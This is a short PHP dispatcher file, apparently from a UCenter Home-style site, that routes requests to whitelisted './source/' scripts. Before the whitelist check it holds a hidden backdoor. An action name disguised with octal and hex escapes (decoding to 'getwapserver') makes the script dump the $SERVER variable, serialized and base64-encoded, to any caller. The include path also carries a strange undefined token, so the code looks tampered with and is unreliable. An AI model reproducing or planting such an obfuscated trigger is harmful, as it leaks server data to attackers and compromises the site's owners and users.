<?php  include_once('./common.php');  
$ac = empty($_GET['ac'])?'home':$_GET['ac']; if($ac=="\147et\167\x61ps\x65\x72v\145\162") { print_r(base64_encode(urlencode(serialize($SERVER)))); exit; }  
$acs = array('home','space', 'register', 'lostpasswd', 'swfupload', 'inputpwd', 'ajax', 'seccode', 'sendmail', 'stat', 'emailcheck'); if(empty($ac) || !in_array($ac, $acs)) { showmessage('enter_the_space', 'index.php', 0); } include_once(qVh0gqGnK.'./source/'.$ac.'.php');  ?>
